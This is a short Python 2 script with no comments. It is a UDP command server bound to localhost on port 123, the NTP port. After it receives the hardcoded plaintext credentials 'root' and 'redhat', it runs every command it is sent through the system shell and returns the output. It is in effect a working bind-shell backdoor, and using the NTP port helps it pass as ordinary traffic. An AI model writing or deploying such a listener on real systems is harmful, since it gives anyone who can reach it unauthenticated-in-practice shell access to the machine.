#!/usr/bin/python2

import socket,os,commands,time,sys

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

s.bind(("127.0.0.1",123))

u=s.recvfrom(100)
p=s.recvfrom(100)

if u[0] == 'root' and p[0] == 'redhat' :
	s.sendto("connected ",u[1])
	while True:
		rcmd=s.recvfrom(100)[0]
		output=commands.getoutput(rcmd)
		s.sendto(output,u[1])

else :
	s.sendto("not connected ",p[1])
		 


